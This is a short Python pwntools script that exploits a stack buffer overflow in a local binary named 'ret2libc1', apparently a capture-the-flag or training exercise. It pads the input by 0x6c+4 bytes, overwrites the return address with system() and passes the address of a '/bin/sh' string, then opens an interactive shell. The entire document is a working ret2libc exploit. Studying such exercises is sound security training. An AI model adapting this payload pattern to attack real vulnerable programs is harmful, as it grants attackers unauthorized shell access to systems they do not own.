from pwn import *

shell = process('./ret2libc1')
bin_sh_addr = 0x8048720
system_addr = 0x8048460
offset = 0x6c + 4
payload = b'A' * offset + p32(system_addr) + p32(0xcccccccc) + p32(bin_sh_addr)
shell.sendline(payload)
shell.interactive()
